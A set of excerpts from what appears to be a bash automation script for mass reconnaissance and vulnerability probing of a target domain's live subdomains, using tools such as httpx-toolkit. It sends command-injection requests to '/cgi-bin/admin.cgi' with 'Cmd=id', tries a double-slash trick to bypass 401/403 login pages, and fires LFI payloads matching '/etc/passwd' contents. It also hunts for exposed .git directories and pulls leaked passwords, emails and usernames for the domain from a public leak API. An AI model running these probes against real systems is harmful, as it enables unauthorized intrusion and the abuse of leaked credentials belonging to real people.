...
cat ${dirdomain}/subdomains/livesubdomain.txt | httpx-toolkit -silent | cariddi -intensive | anew ${dirdomain}/parameters/cariddi.txt &> /dev/null
...
cat ${dirdomain}/subdomains/livesubdomain.txt | sed 's#$#/.git/HEAD#g' | httpx-toolkit -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew ${dirdomain}/osint/git_HEAD.txt 2> /dev/null

#403 login_Bypass

cat ${dirdomain}/subdomains/livesubdomain.txt | httpx-toolkit -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx-toolkit -path //login -mc 200 -t 300 -nc -silent | anew ${dirdomain}/osint/login_Bypass 2> /dev/null
...
#done
#RCE
cat ${dirdomain}/subdomains/livesubdomain.txt | httpx-toolkit -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | tee -a ${dirdomain}/osint/RCE.txt 2>/dev/null

cat ${dirdomain}/subdomains/livesubdomain.txt | while read h; do 
...
if curl -s https://api.proxynova.com/comb?query=${dirdomain} | jq -r '.lines[]' > $leaks_file 2>/dev/null; then
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Getting Leaked Passwords, Emails, and Usernames - ${NORMAL}[${GREEN}proxynova${TICK}${NORMAL}]${TTAB} LeakSearch: ${LGREEN}Completed"
else
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Getting Leaked Passwords, Emails, and Usernames - ${NORMAL}[${RED}proxynova${CROSS}${NORMAL}]${TTAB} LeakSearch: ${LRED}Failed"
fi
...
cat ${dirdomain}/subdomains/livesubdomain.txt | httpx-toolkit -silent | grep -i "https://" | anew ${dirdomain}/subdomains/subsnuc.txt&> /dev/null
...
lfirecon -f ${dirdomain}/parameters/newlfi.txt -p $WORDLISTS_DIR/payloads.txt -o ${dirdomain}/vulnerability/vuln_lfi.txt &> /dev/null
 cat ${dirdomain}/parameters/newlfi.txt |  httpx-toolkit -silent -path $WORDLISTS_DIR/lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"  | anew -q $dirdomain/vulnerability/lfi.txt&> /dev/null
...
cat ${dirdomain}/subdomains/livesubdomain.txt | httpx-toolkit -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "$httpxpath" -mc 200 -t 60 |tee -a ${dirdomain}/info/Information.txt &> /dev/null
cat ${dirdomain}/subdomains/livesubdomain.txt | sed 's#$#/.git/HEAD#g' | httpx-toolkit -silent -content-length -status-code 301,302 -p 80,443,8080,8443,9000,9001,9002,9003,8088 -threads 500 -title >> ${dirdomain}/info/Information.txt &> /dev/null
